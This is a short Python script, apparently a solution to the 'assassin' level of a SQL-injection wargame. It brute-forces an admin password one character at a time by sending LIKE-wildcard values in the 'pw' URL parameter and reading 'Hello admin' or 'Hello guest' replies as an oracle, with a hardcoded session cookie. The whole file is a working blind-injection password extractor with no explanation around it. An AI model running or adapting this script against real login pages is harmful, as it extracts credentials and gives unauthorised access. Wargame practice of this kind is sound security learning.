import urllib.request
from urllib.parse import quote

key = ""
for i in range(1, 9):
    buf=chr(0)
    for j in range(48, 91):
        url = "http://los.eagle-jump.org/assassin_bec1c90a48bc3a9f95fbf0c8ae8c88e1.php?pw="
        data = "{}%".format(key+chr(j))
        print(data)
        # data = quote(data)

        re = urllib.request.Request(url + data)
        re.add_header("User-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.75 Safari/537.36") 
        re.add_header("Cookie", "PHPSESSID=3q0e1uadocute8g1nvp6u7l6k1")
        res = urllib.request.urlopen(re)
        result=str(res.read())

        if  result.find("Hello admin") != -1:
            key += chr(j).lower()
            print(key)
            buf=str(1)
            break

        elif result.find("Hello guest") != -1:
            buf=chr(j).lower()

    if buf != str(1):
        key += buf
print(key)